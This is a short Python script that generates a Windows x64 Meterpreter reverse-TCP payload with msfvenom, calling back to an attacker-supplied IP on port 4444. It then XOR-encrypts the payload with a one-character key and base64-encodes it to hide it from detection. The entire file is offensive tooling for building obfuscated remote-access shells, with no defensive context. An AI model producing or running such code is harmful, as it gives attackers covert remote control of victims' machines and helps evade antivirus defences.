import os 
import base64 
from itertools import cycle 
import binascii

ip = str(input("ip: "))
os.system("""msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST={} LPORT=4444 -f raw -o output.reverse""".format(ip)) # you have to adjust the payload for your environment.

#file read
f = open("output.reverse","r")
payload = f.read()
f.close()

key = "b" # xor keys

#xor encryption
encryptedPayload = ''.join(chr(ord(c)^ord(k)) for c,k in zip(payload, cycle(key)))

#base64 encoding
finalPayload = base64.b64encode(encryptedPayload)

#write obfustaced payload to a file
c = open("obs_payload.txt","w+")
c.write(finalPayload)
c.close()

